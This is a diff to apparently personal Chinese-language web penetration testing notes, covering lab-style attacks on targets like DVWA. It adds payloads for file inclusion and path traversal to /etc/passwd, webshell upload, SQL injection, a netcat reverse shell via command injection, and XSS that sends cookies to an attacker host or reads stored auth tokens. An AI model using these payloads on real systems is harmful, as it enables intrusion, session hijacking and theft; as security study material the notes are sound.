@@ -23,6 +23,22 @@ root默认密码：toor
 9. burpsuite intruder爆破爬取URL
 10. repeater多次修改请求
 11. 用户身份在客户端请求参数中携带，如id，篡改。
+12. 请求参数指定URL路径，可构造任意远程页面如`http://192.168.56.11/dvwa/vulnerabilities/fi/?page=http://192.168.56.10/index.html`，使服务器加载外部页面，或目录跨越`../../../../../etc/passwd`
+13. 上传文件在web目录下，获取上传存储路径，通过burpsuite修改content-type，上传php，获取webshell。
+
+### SQL注入
+
+1. 使用orderby获取到列数，再用unoion查询其他信息如`@@version`, `currentuser()`, `informationschema.tables`
+1. 通过SQL注入`n=char_length(current_user())`，burp intruder爆破数据库用户名长度
+1. `currentuser like 'a@%`爆破每个字符
+1. 通过sleep时间盲注
+1. 通过SQLMap检测SQLi，查询表数据，数据库其他用户信息，sqlshell
+
+### 命令注入
+
+1. 提交`ls /bin/nc*`查看是否存在netcat
+1. 在攻击者监听`nc -lp 1234 -v`
+1. 在命令注入`nc.traditional -e /bin/bash x.x.x.x 1234 &`反弹shell
 
 
 ## 安全维度
@@ -79,7 +95,7 @@ function dosubmit() {
 
 ##### XSS
 
-特征：输入`<`原样显示，查看源码未做编码。
+特征：输入`<`原样显示，查看源码未做编码，可先用`<h1>`尝试。
 
 POC：
 
@@ -88,8 +104,10 @@ POC：
 - 闭合如`<input value="输入的内容">`：`" onmouserover="javascript:alert('xss')` --> `<input value="输入的内容" onmouseover="javascript:alert('xss')">`
 - 在href属性中注入链接或者其他事件，使用户在点击的时候触发：`<a href="javascript:alert('xss')">点击我</a>`
 
-!!! example "利用XSS获取cookie"
-    启动一个服务器接收请求，利用XSS发送请求`<script>document.write('<img src="http://192.168.56.10:88/'+document.cookie+'">');</script>`，获取受害者cookie。
+!!! example "示例"
+    - 利用XSS获取cookie：启动一个服务器接收请求，利用XSS发送请求`<script>document.write('<img src="http://192.168.56.10:88/'+document.cookie+'">');</script>`，获取受害者cookie。
+    - 利用XSS获取HTML5本地存储`<script>alert(window.localStorage.MessageOfTheDay);</script>`或会话存储`<script>alert(window.sessionStorage.getItem("Secure.AuthenticationToken"));</script>`
+    - 利用XSS诱骗受害者下载运行HTA获取反弹shell
 
 
 #### token
